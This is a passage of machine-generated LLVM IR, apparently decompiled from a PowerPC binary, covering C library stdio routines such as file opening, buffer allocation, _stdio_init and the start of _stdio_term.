  %v1_1000e338 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000e338 = and i32 %v1_1000e338, %v1_1000e334
  store i32 %v2_1000e338, i32* %r0.global-to-local, align 4
  %v4_1000e33c = icmp eq i32 %v2_1000e338, %v1_1000e334
  store i1 %v4_1000e33c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000e33c, label %dec_label_pc_1000e344, label %dec_label_pc_1000e26c

dec_label_pc_1000e344:                            ; preds = %dec_label_pc_1000e320
  %v2_1000e344 = sub i32 -1, %arg1
  %v3_1000e344 = and i32 %v0_1000e330, %v2_1000e344
  store i32 %v3_1000e344, i32* %r0.global-to-local, align 4
  %v1_1000e348 = and i32 %v3_1000e344, 1024
  store i32 %v1_1000e348, i32* %r9.global-to-local, align 4
  %v3_1000e348 = icmp eq i32 %v1_1000e348, 0
  br i1 %v3_1000e348, label %dec_label_pc_1000e36c, label %dec_label_pc_1000e350

dec_label_pc_1000e350:                            ; preds = %dec_label_pc_1000e344
  %v0_1000e350 = load i32, i32* @r29, align 4
  store i32 %v0_1000e350, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268493668, i32* @lr, align 4
  %v2_1000e360 = call i32 @__libc_fcntl(i32 %v0_1000e350)
  store i32 %v2_1000e360, i32* %r3.global-to-local, align 4
  %v3_1000e364 = icmp eq i32 %v2_1000e360, 0
  store i1 %v3_1000e364, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e364, label %dec_label_pc_1000e36c, label %dec_label_pc_1000e26c

dec_label_pc_1000e36c:                            ; preds = %dec_label_pc_1000e350, %dec_label_pc_1000e344
  %v1_1000e36c = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_1000e36c, i32* %r0.global-to-local, align 4
  %v0_1000e370 = load i32, i32* @r30, align 4
  %v2_1000e370 = or i32 %v0_1000e370, %v1_1000e36c
  store i32 %v2_1000e370, i32* @r30, align 4
  br label %dec_label_pc_1000e3a4

dec_label_pc_1000e378:                            ; preds = %dec_label_pc_1000e318
  %v3_1000e378 = icmp eq i32 %v0_1000e378, -1
  store i1 %v3_1000e378, i1* %cr7_eq.global-to-local, align 1
  %v0_1000e388.pre = load i32, i32* @r30, align 4
  br i1 %v3_1000e378, label %dec_label_pc_1000e384, label %dec_label_pc_1000e380

dec_label_pc_1000e380:                            ; preds = %dec_label_pc_1000e378
  %v1_1000e380 = or i32 %v0_1000e388.pre, 65536
  store i32 %v1_1000e380, i32* @r30, align 4
  br label %dec_label_pc_1000e384

dec_label_pc_1000e384:                            ; preds = %dec_label_pc_1000e378, %dec_label_pc_1000e380
  %v0_1000e388 = phi i32 [ %v1_1000e380, %dec_label_pc_1000e380 ], [ %v0_1000e388.pre, %dec_label_pc_1000e378 ]
  store i32 %arg1, i32* @r3, align 4
  store i32 %v0_1000e388, i32* @r4, align 4
  %v2_1000e394 = call i32 @__libc_open(i32 %arg1, i32 %v0_1000e388)
  store i32 %v2_1000e394, i32* %r3.global-to-local, align 4
  %v1_1000e398 = icmp slt i32 %v2_1000e394, 0
  %v3_1000e398 = icmp eq i32 %v2_1000e394, 0
  store i1 %v3_1000e398, i1* %cr7_eq.global-to-local, align 1
  %v1_1000e39c = load i32, i32* @r31, align 4
  %v2_1000e39c = add i32 %v1_1000e39c, 4
  %v3_1000e39c = inttoptr i32 %v2_1000e39c to i32*
  store i32 %v2_1000e394, i32* %v3_1000e39c, align 4
  br i1 %v1_1000e398, label %dec_label_pc_1000e28c, label %dec_label_pc_1000e384.dec_label_pc_1000e3a4_crit_edge

dec_label_pc_1000e384.dec_label_pc_1000e3a4_crit_edge: ; preds = %dec_label_pc_1000e384
  %v0_1000e3a8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e3a4

dec_label_pc_1000e3a4:                            ; preds = %dec_label_pc_1000e384.dec_label_pc_1000e3a4_crit_edge, %dec_label_pc_1000e36c
  %v0_1000e3a8 = phi i32 [ %v0_1000e3a8.pre, %dec_label_pc_1000e384.dec_label_pc_1000e3a4_crit_edge ], [ %v2_1000e370, %dec_label_pc_1000e36c ]
  %v0_1000e3a4 = load i32, i32* @r31, align 4
  %v1_1000e3a4 = inttoptr i32 %v0_1000e3a4 to i16*
  %v2_1000e3a4 = load i16, i16* %v1_1000e3a4, align 2
  %v3_1000e3a4 = zext i16 %v2_1000e3a4 to i32
  %v1_1000e3a8 = urem i32 %v0_1000e3a8, 4
  store i32 %v1_1000e3a8, i32* %r9.global-to-local, align 4
  %v1_1000e3ac = add i32 %v0_1000e3a4, 4
  %v2_1000e3ac = inttoptr i32 %v1_1000e3ac to i32*
  %v3_1000e3ac = load i32, i32* %v2_1000e3ac, align 4
  store i32 %v3_1000e3ac, i32* %r3.global-to-local, align 4
  store i32 2147483647, i32* %r0.global-to-local, align 4
  %v1_1000e3b8 = add nuw nsw i32 %v1_1000e3a8, 1
  store i32 %v1_1000e3b8, i32* %r9.global-to-local, align 4
  %v1_1000e3bc = call i32 @__asm_rlwinm(i32 %v3_1000e3a4, i32 0, i32 18, i32 18)
  %v0_1000e3c0 = load i32, i32* @r30, align 4
  %v1_1000e3c0 = call i32 @__asm_rlwinm(i32 %v0_1000e3c0, i32 0, i32 21, i32 21)
  %v0_1000e3c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000e3c8 = load i32, i32* %r0.global-to-local, align 4
  %v4_1000e3c8 = icmp eq i32 %v0_1000e3c8, %v1_1000e3c8
  store i1 %v4_1000e3c8, i1* %cr7_eq.global-to-local, align 1
  %v2_1000e3cc = or i32 %v1_1000e3c0, %v1_1000e3bc
  %v1_1000e3c4 = mul nuw nsw i32 %v1_1000e3b8, 16
  %v1_1000e3d0 = xor i32 %v1_1000e3c4, 48
  store i32 %v1_1000e3d0, i32* %r9.global-to-local, align 4
  %v2_1000e3d4 = or i32 %v2_1000e3cc, %v1_1000e3d0
  %v0_1000e3d8 = load i32, i32* @r30, align 4
  %v1_1000e3d8 = call i32 @__asm_rlwinm(i32 %v0_1000e3d8, i32 31, i32 16, i32 16)
  %v2_1000e3dc = or i32 %v2_1000e3d4, %v1_1000e3d8
  store i32 %v2_1000e3dc, i32* %r0.global-to-local, align 4
  %v1_1000e3e0 = trunc i32 %v2_1000e3dc to i16
  %v2_1000e3e0 = load i32, i32* @r31, align 4
  %v3_1000e3e0 = inttoptr i32 %v2_1000e3e0 to i16*
  store i16 %v1_1000e3e0, i16* %v3_1000e3e0, align 2
  %v0_1000e3e4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e3e4, label %dec_label_pc_1000e418, label %dec_label_pc_1000e3e8

dec_label_pc_1000e3e8:                            ; preds = %dec_label_pc_1000e3a4
  %v0_1000e3f0 = load i32, i32* @r2, align 4
  store i32 %v0_1000e3f0, i32* %r9.global-to-local, align 4
  %v1_1000e3f4 = add i32 %v0_1000e3f0, -28672
  %v1_1000e3f8 = inttoptr i32 %v1_1000e3f4 to i32*
  %v2_1000e3f8 = load i32, i32* %v1_1000e3f8, align 4
  store i32 %v2_1000e3f8, i32* @r29, align 4
  store i32 268493824, i32* @lr, align 4
  %v0_1000e3fc = call i32 @isatty()
  store i32 %v0_1000e3fc, i32* %r3.global-to-local, align 4
  %v3_1000e400 = icmp eq i32 %v0_1000e3fc, 0
  store i1 %v3_1000e400, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e400, label %dec_label_pc_1000e414, label %dec_label_pc_1000e408

dec_label_pc_1000e408:                            ; preds = %dec_label_pc_1000e3e8
  %v0_1000e408 = load i32, i32* @r31, align 4
  %v1_1000e408 = inttoptr i32 %v0_1000e408 to i16*
  %v2_1000e408 = load i16, i16* %v1_1000e408, align 2
  %v3_1000e408 = zext i16 %v2_1000e408 to i32
  %v1_1000e40c = or i32 %v3_1000e408, 256
  store i32 %v1_1000e40c, i32* %r0.global-to-local, align 4
  %v1_1000e410 = trunc i32 %v1_1000e40c to i16
  store i16 %v1_1000e410, i16* %v1_1000e408, align 2
  br label %dec_label_pc_1000e414

dec_label_pc_1000e414:                            ; preds = %dec_label_pc_1000e3e8, %dec_label_pc_1000e408
  %v0_1000e414 = load i32, i32* @r29, align 4
  %v1_1000e414 = load i32, i32* @r30, align 4
  %v2_1000e414 = inttoptr i32 %v1_1000e414 to i32*
  store i32 %v0_1000e414, i32* %v2_1000e414, align 4
  br label %dec_label_pc_1000e418

dec_label_pc_1000e418:                            ; preds = %dec_label_pc_1000e3a4, %dec_label_pc_1000e414
  %v0_1000e418 = load i32, i32* @r31, align 4
  %v1_1000e418 = add i32 %v0_1000e418, 8
  %v2_1000e418 = inttoptr i32 %v1_1000e418 to i32*
  %v3_1000e418 = load i32, i32* %v2_1000e418, align 4
  store i32 %v3_1000e418, i32* %r0.global-to-local, align 4
  %v3_1000e41c = icmp eq i32 %v3_1000e418, 0
  store i1 %v3_1000e41c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e41c, label %dec_label_pc_1000e424, label %dec_label_pc_1000e454

dec_label_pc_1000e424:                            ; preds = %dec_label_pc_1000e418
  store i32 4096, i32* %r3.global-to-local, align 4
  store i32 268493868, i32* @lr, align 4
  %v1_1000e428 = call i32 @malloc(i32 4096)
  store i32 %v1_1000e428, i32* %r3.global-to-local, align 4
  %v3_1000e42c = icmp eq i32 %v1_1000e428, 0
  store i1 %v3_1000e42c, i1* %cr7_eq.global-to-local, align 1
  %v1_1000e430 = load i32, i32* @r31, align 4
  %v2_1000e430 = add i32 %v1_1000e430, 8
  %v3_1000e430 = inttoptr i32 %v2_1000e430 to i32*
  store i32 %v1_1000e428, i32* %v3_1000e430, align 4
  %v1_1000e450 = load i32, i32* @r31, align 4
  br i1 %v3_1000e42c, label %dec_label_pc_1000e450, label %dec_label_pc_1000e438

dec_label_pc_1000e438:                            ; preds = %dec_label_pc_1000e424
  %v1_1000e438 = inttoptr i32 %v1_1000e450 to i16*
  %v2_1000e438 = load i16, i16* %v1_1000e438, align 2
  %v3_1000e438 = zext i16 %v2_1000e438 to i32
  store i32 %v3_1000e438, i32* %r0.global-to-local, align 4
  %v1_1000e43c = add i32 %v1_1000e428, 4096
  store i32 %v1_1000e43c, i32* %r9.global-to-local, align 4
  %v2_1000e440 = add i32 %v1_1000e450, 12
  %v3_1000e440 = inttoptr i32 %v2_1000e440 to i32*
  store i32 %v1_1000e43c, i32* %v3_1000e440, align 4
  %v0_1000e444 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e444 = or i32 %v0_1000e444, 16384
  store i32 %v1_1000e444, i32* %r0.global-to-local, align 4
  %v1_1000e448 = trunc i32 %v1_1000e444 to i16
  %v2_1000e448 = load i32, i32* @r31, align 4
  %v3_1000e448 = inttoptr i32 %v2_1000e448 to i16*
  store i16 %v1_1000e448, i16* %v3_1000e448, align 2
  br label %dec_label_pc_1000e454

dec_label_pc_1000e450:                            ; preds = %dec_label_pc_1000e424
  %v2_1000e450 = add i32 %v1_1000e450, 12
  %v3_1000e450 = inttoptr i32 %v2_1000e450 to i32*
  store i32 0, i32* %v3_1000e450, align 4
  br label %dec_label_pc_1000e454

dec_label_pc_1000e454:                            ; preds = %dec_label_pc_1000e418, %dec_label_pc_1000e438, %dec_label_pc_1000e450
  %v0_1000e454 = load i32, i32* @r31, align 4
  %v1_1000e454 = inttoptr i32 %v0_1000e454 to i16*
  %v2_1000e454 = load i16, i16* %v1_1000e454, align 2
  %v3_1000e454 = zext i16 %v2_1000e454 to i32
  store i32 %v3_1000e454, i32* %r9.global-to-local, align 4
  %v3_1000e45c = add i32 %v0_1000e454, 2
  %v4_1000e45c = inttoptr i32 %v3_1000e45c to i8*
  store i8 0, i8* %v4_1000e45c, align 1
  store i32 0, i32* @r11, align 4
  %v0_1000e464 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e464 = and i32 %v0_1000e464, 8192
  store i32 %v1_1000e464, i32* %r0.global-to-local, align 4
  %v3_1000e464 = icmp eq i32 %v1_1000e464, 0
  store i1 %v3_1000e464, i1* @cr0_eq, align 1
  %v3_1000e46c = load i32, i32* @global_var_100211d4.569, align 4
  store i32 %v3_1000e46c, i32* @r9, align 4
  %v0_1000e470 = load i32, i32* @r31, align 4
  %v1_1000e470 = add i32 %v0_1000e470, 8
  %v2_1000e470 = inttoptr i32 %v1_1000e470 to i32*
  %v3_1000e470 = load i32, i32* %v2_1000e470, align 4
  store i32 %v3_1000e470, i32* %r0.global-to-local, align 4
  %v2_1000e474 = add i32 %v0_1000e470, 52
  %v3_1000e474 = inttoptr i32 %v2_1000e474 to i32*
  store i32 %v3_1000e46c, i32* %v3_1000e474, align 4
  %v0_1000e478 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e478 = load i32, i32* @r31, align 4
  %v2_1000e478 = add i32 %v1_1000e478, 20
  %v3_1000e478 = inttoptr i32 %v2_1000e478 to i32*
  store i32 %v0_1000e478, i32* %v3_1000e478, align 4
  %v0_1000e47c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e47c = load i32, i32* @r31, align 4
  %v2_1000e47c = add i32 %v1_1000e47c, 24
  %v3_1000e47c = inttoptr i32 %v2_1000e47c to i32*
  store i32 %v0_1000e47c, i32* %v3_1000e47c, align 4
  %v0_1000e480 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e480 = load i32, i32* @r31, align 4
  %v2_1000e480 = add i32 %v1_1000e480, 28
  %v3_1000e480 = inttoptr i32 %v2_1000e480 to i32*
  store i32 %v0_1000e480, i32* %v3_1000e480, align 4
  %v0_1000e484 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e484 = load i32, i32* @r31, align 4
  %v2_1000e484 = add i32 %v1_1000e484, 16
  %v3_1000e484 = inttoptr i32 %v2_1000e484 to i32*
  store i32 %v0_1000e484, i32* %v3_1000e484, align 4
  %v0_1000e488 = load i32, i32* @r11, align 4
  %v1_1000e488 = load i32, i32* @r31, align 4
  %v2_1000e488 = add i32 %v1_1000e488, 44
  %v3_1000e488 = inttoptr i32 %v2_1000e488 to i32*
  store i32 %v0_1000e488, i32* %v3_1000e488, align 4
  br i1 %v3_1000e464, label %dec_label_pc_1000e5fc, label %dec_label_pc_1000e490

dec_label_pc_1000e490:                            ; preds = %dec_label_pc_1000e454
  store i32 268566528, i32* @r9, align 4
  %v0_1000e494 = load i32, i32* @r2, align 4
  %v1_1000e494 = add i32 %v0_1000e494, -29808
  store i32 %v1_1000e494, i32* %r29.global-to-local, align 4
  %v3_1000e49c = load i32, i32* @global_var_100212e4.563, align 4
  store i32 %v3_1000e49c, i32* %r0.global-to-local, align 4
  %v4_1000e4a0 = icmp eq i32 %v3_1000e49c, %v1_1000e494
  store i1 %v4_1000e4a0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000e4a0, label %dec_label_pc_1000e4d8, label %dec_label_pc_1000e4ac

dec_label_pc_1000e4ac:                            ; preds = %dec_label_pc_1000e490
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000e4b0 = load i32, i32* @r11, align 4
  %v4_1000e4b0 = icmp eq i32 %v1_1000e4b0, 268566528
  store i1 %v4_1000e4b0, i1* @cr0_eq, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_100212dc.562 to i32), i32* @r3, align 4
  %v0_1000e4d0 = call i32 @__lll_lock_wait_private()
  store i32 %v0_1000e4d0, i32* %r3.global-to-local, align 4
  %v0_1000e4d4.pre = load i32, i32* %r29.global-to-local, align 4
  %v0_1000e4dc.pre.pre = load i32, i32* @r2, align 4
  store i32 %v0_1000e4d4.pre, i32* @global_var_100212e4.563, align 4
  br label %dec_label_pc_1000e4d8

dec_label_pc_1000e4d8:                            ; preds = %dec_label_pc_1000e490, %dec_label_pc_1000e4ac
  %v0_1000e4dc = phi i32 [ %v0_1000e494, %dec_label_pc_1000e490 ], [ %v0_1000e4dc.pre.pre, %dec_label_pc_1000e4ac ]
  %v1_1000e4dc = add i32 %v0_1000e4dc, -29808
  store i32 %v1_1000e4dc, i32* %r29.global-to-local, align 4
  %v3_1000e4e8 = load i32, i32* @global_var_100212d8.537, align 4
  store i32 %v3_1000e4e8, i32* %r0.global-to-local, align 4
  %v3_1000e4f0 = load i32, i32* @global_var_100212e0.565, align 4
  %v4_1000e4f4 = icmp eq i32 %v3_1000e4e8, %v1_1000e4dc
  store i1 %v4_1000e4f4, i1* %cr7_eq.global-to-local, align 1
  %v1_1000e4f8 = add i32 %v3_1000e4f0, 1
  store i32 %v1_1000e4f8, i32* %r9.global-to-local, align 4
  store i32 %v1_1000e4f8, i32* @global_var_100212e0.565, align 4
  br i1 %v4_1000e4f4, label %dec_label_pc_1000e538, label %dec_label_pc_1000e534

dec_label_pc_1000e534:                            ; preds = %dec_label_pc_1000e4d8
  store i32 0, i32* @r9, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* @cr0_eq, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_100212d0.536 to i32), i32* @r3, align 4
  %v0_1000e530 = call i32 @__lll_lock_wait_private()
  store i32 %v0_1000e530, i32* %r3.global-to-local, align 4
  %v0_1000e534.pre = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000e534.pre, i32* @global_var_100212d8.537, align 4
  br label %dec_label_pc_1000e538

dec_label_pc_1000e538:                            ; preds = %dec_label_pc_1000e4d8, %dec_label_pc_1000e534
  store i32 ptrtoint (i32* @global_var_100212d0.536 to i32), i32* %r3.global-to-local, align 4
  %v3_1000e544 = load i32, i32* bitcast (i32** @global_var_100211d0.540 to i32*), align 4
  store i32 %v3_1000e544, i32* %r0.global-to-local, align 4
  %v3_1000e548 = load i32, i32* @global_var_100212d4.538, align 4
  %v1_1000e54c = add i32 %v3_1000e548, 1
  store i32 %v1_1000e54c, i32* @global_var_100212d4.538, align 4
  %v1_1000e554 = load i32, i32* @r31, align 4
  %v2_1000e554 = add i32 %v1_1000e554, 32
  %v3_1000e554 = inttoptr i32 %v2_1000e554 to i32*
  store i32 %v3_1000e544, i32* %v3_1000e554, align 4
  %v0_1000e558 = load i32, i32* @r31, align 4
  store i32 %v0_1000e558, i32* bitcast (i32** @global_var_100211d0.540 to i32*), align 4
  %v3_1000e55c = load i32, i32* @global_var_100212d4.538, align 4
  %v1_1000e560 = add i32 %v3_1000e55c, -1
  store i32 %v1_1000e560, i32* %r9.global-to-local, align 4
  %v3_1000e564 = icmp eq i32 %v1_1000e560, 0
  store i1 %v3_1000e564, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_1000e560, i32* @global_var_100212d4.538, align 4
  br i1 %v3_1000e564, label %dec_label_pc_1000e570, label %dec_label_pc_1000e5a4

dec_label_pc_1000e570:                            ; preds = %dec_label_pc_1000e538
  store i32 0, i32* @global_var_100212d8.537, align 4
  %v0_1000e580.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000e578

dec_label_pc_1000e578:                            ; preds = %dec_label_pc_1000e578, %dec_label_pc_1000e570
  %v0_1000e580 = phi i1 [ false, %dec_label_pc_1000e578 ], [ %v0_1000e580.pr, %dec_label_pc_1000e570 ]
  br i1 %v0_1000e580, label %dec_label_pc_1000e584, label %dec_label_pc_1000e578

dec_label_pc_1000e584:                            ; preds = %dec_label_pc_1000e578
  %v0_1000e584 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000e584 = icmp eq i32 %v0_1000e584, 1
  store i1 %v3_1000e584, i1* %cr7_eq.global-to-local, align 1
  %tmp15 = icmp slt i32 %v0_1000e584, 2
  br i1 %tmp15, label %dec_label_pc_1000e5a4, label %dec_label_pc_1000e58c

dec_label_pc_1000e58c:                            ; preds = %dec_label_pc_1000e584
  store i32 221, i32* %r0.global-to-local, align 4
  store i32 129, i32* @r4, align 4
  %v0_1000e5a0 = call i32 @__asm_mfcr()
  store i32 %v0_1000e5a0, i32* %r3.global-to-local, align 4
  store i32 %v0_1000e5a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000e5a4

dec_label_pc_1000e5a4:                            ; preds = %dec_label_pc_1000e538, %dec_label_pc_1000e584, %dec_label_pc_1000e58c
  store i32 268566528, i32* @r11, align 4
  store i32 ptrtoint (i32* @global_var_100212dc.562 to i32), i32* %r3.global-to-local, align 4
  %v3_1000e5ac = load i32, i32* @global_var_100212e0.565, align 4
  %v1_1000e5b0 = add i32 %v3_1000e5ac, -1
  store i32 %v1_1000e5b0, i32* @r9, align 4
  %v3_1000e5b4 = icmp eq i32 %v1_1000e5b0, 0
  store i1 %v3_1000e5b4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_1000e5b0, i32* @global_var_100212e0.565, align 4
  br i1 %v3_1000e5b4, label %dec_label_pc_1000e5c0, label %dec_label_pc_1000e5fc

dec_label_pc_1000e5c0:                            ; preds = %dec_label_pc_1000e5a4
  store i32 0, i32* @global_var_100212e4.563, align 4
  %v0_1000e5d0.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000e5c8

dec_label_pc_1000e5c8:                            ; preds = %dec_label_pc_1000e5c8, %dec_label_pc_1000e5c0
  %v0_1000e5d0 = phi i1 [ false, %dec_label_pc_1000e5c8 ], [ %v0_1000e5d0.pr, %dec_label_pc_1000e5c0 ]
  br i1 %v0_1000e5d0, label %dec_label_pc_1000e5d4, label %dec_label_pc_1000e5c8

dec_label_pc_1000e5d4:                            ; preds = %dec_label_pc_1000e5c8
  %v0_1000e5d4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000e5d4 = icmp eq i32 %v0_1000e5d4, 1
  store i1 %v3_1000e5d4, i1* %cr7_eq.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_1000e5d4, 2
  br i1 %tmp16, label %dec_label_pc_1000e5fc, label %dec_label_pc_1000e5dc

dec_label_pc_1000e5dc:                            ; preds = %dec_label_pc_1000e5d4
  store i32 221, i32* %r0.global-to-local, align 4
  store i32 129, i32* @r4, align 4
  %v0_1000e5f0 = call i32 @__asm_mfcr()
  store i32 %v0_1000e5f0, i32* %r3.global-to-local, align 4
  store i32 %v0_1000e5f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000e5fc

dec_label_pc_1000e5f8:                            ; preds = %dec_label_pc_1000e28c, %dec_label_pc_1000e26c, %dec_label_pc_1000e298
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000e5fc

dec_label_pc_1000e5fc:                            ; preds = %dec_label_pc_1000e5a4, %dec_label_pc_1000e5d4, %dec_label_pc_1000e454, %dec_label_pc_1000e2d8, %dec_label_pc_1000e5dc, %dec_label_pc_1000e5f8
  store i32 %v0_1000e22c, i32* %r0.global-to-local, align 4
  %v0_1000e600 = load i32, i32* @r31, align 4
  store i32 %v0_1000e600, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000e600

; uselistorder directives
  uselistorder i32 %v0_1000e5f0, { 1, 0 }
  uselistorder i32 %v0_1000e5a0, { 1, 0 }
  uselistorder i32 %v1_1000e450, { 2, 0, 1 }
  uselistorder i32 %v1_1000e3a8, { 1, 0 }
  uselistorder i32 %v2_1000e394, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000e388, { 1, 0 }
  uselistorder i32 %v0_1000e378, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000e2c8, { 1, 0 }
  uselistorder i1 %v3_1000e260, { 1, 0 }
  uselistorder i1 %v3_1000e254, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 4, 1, 5, 7, 10, 13, 6, 14, 8, 9, 15, 16, 11, 17, 12, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 16384, { 45, 46, 0, 33, 9, 24, 1, 2, 3, 4, 5, 6, 7, 8, 26, 10, 27, 28, 29, 30, 25, 11, 34, 12, 35, 36, 37, 13, 31, 14, 38, 15, 39, 40, 17, 16, 18, 41, 42, 19, 43, 44, 32, 20, 21, 22, 23 }
  uselistorder i32 4096, { 9, 2, 10, 11, 0, 3, 4, 5, 8, 6, 7, 1 }
  uselistorder i32 21, { 13, 14, 3, 4, 0, 5, 6, 1, 7, 8, 9, 10, 11, 12, 2 }
  uselistorder i32 (i32, i32)* @__libc_open, { 1, 0, 3, 2, 6, 5, 4 }
  uselistorder i32 (i32)* @__libc_fcntl, { 1, 0, 14, 11, 10, 13, 12, 9, 8, 5, 4, 7, 6, 3, 2 }
  uselistorder i32 1024, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @malloc, { 7, 6, 1, 0, 4, 3, 5, 2, 9, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 8 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_1000e5fc, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000e5f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e5a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e538, { 1, 0 }
  uselistorder label %dec_label_pc_1000e4d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e454, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e418, { 1, 0 }
  uselistorder label %dec_label_pc_1000e414, { 1, 0 }
  uselistorder label %dec_label_pc_1000e384, { 1, 0 }
  uselistorder label %dec_label_pc_1000e318, { 1, 0 }
  uselistorder label %dec_label_pc_1000e2d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e2bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000e2a8, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268494400, i32* @lr, align 4
  %v0_1000e63c = call i32 @isatty()
  %v3_1000e640 = icmp eq i32 %v0_1000e63c, 0
  br i1 %v3_1000e640, label %dec_label_pc_1000e648, label %dec_label_pc_1000e658

dec_label_pc_1000e648:                            ; preds = %entry
  %v3_1000e64c = load i16, i16* @global_var_100210bc.523, align 2
  %v1_1000e650 = xor i16 %v3_1000e64c, 256
  store i16 %v1_1000e650, i16* @global_var_100210bc.523, align 2
  br label %dec_label_pc_1000e658

dec_label_pc_1000e658:                            ; preds = %entry, %dec_label_pc_1000e648
  store i32 268494432, i32* @lr, align 4
  %v0_1000e65c = call i32 @isatty()
  %v3_1000e660 = icmp eq i32 %v0_1000e65c, 0
  br i1 %v3_1000e660, label %dec_label_pc_1000e668, label %dec_label_pc_1000e67c

dec_label_pc_1000e668:                            ; preds = %dec_label_pc_1000e658
  %v3_1000e670 = load i16, i16* @global_var_10021100.524, align 2
  %v1_1000e674 = xor i16 %v3_1000e670, 256
  store i16 %v1_1000e674, i16* @global_var_10021100.524, align 2
  br label %dec_label_pc_1000e67c

dec_label_pc_1000e67c:                            ; preds = %dec_label_pc_1000e658, %dec_label_pc_1000e668
  %v0_1000e680 = load i32, i32* @r30, align 4
  %v1_1000e680 = load i32, i32* @r31, align 4
  %v2_1000e680 = inttoptr i32 %v1_1000e680 to i32*
  store i32 %v0_1000e680, i32* %v2_1000e680, align 4
  ret i32 %v0_1000e65c

; uselistorder directives
  uselistorder i16* @global_var_10021100.524, { 1, 0 }
  uselistorder i16 256, { 1, 0 }
  uselistorder i32 ()* @isatty, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e67c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e658, { 1, 0 }
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000e6e8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000e6e8, i32* %r3.global-to-local, align 4
  %v3_1000e6ec = load i32, i32* bitcast (i32** @global_var_100211d0.540 to i32*), align 4
  store i32 %v3_1000e6ec, i32* %r11.global-to-local, align 4
  %v0_1000e6f0 = load i32, i32* @r2, align 4
  %v1_1000e6f0 = add i32 %v0_1000e6f0, -29808
  store i32 %v1_1000e6f0, i32* %r4.global-to-local, align 4
  %v0_1000e6f4 = load i32, i32* @r31, align 4
  %v3_1000e7807 = icmp eq i32 %v3_1000e6ec, 0
  %v1_1000e7849 = add i32 %v3_1000e6ec, 56
  store i32 %v1_1000e7849, i32* %r9.global-to-local, align 4
  br i1 %v3_1000e7807, label %dec_label_pc_1000e790, label %dec_label_pc_1000e6fc

dec_label_pc_1000e6fc:                            ; preds = %entry, %dec_label_pc_1000e760.dec_label_pc_1000e6fc_crit_edge
  %v1_1000e700 = phi i32 [ %v1_1000e700.pre, %dec_label_pc_1000e760.dec_label_pc_1000e6fc_crit_edge ], [ %v1_1000e6f0, %entry ]
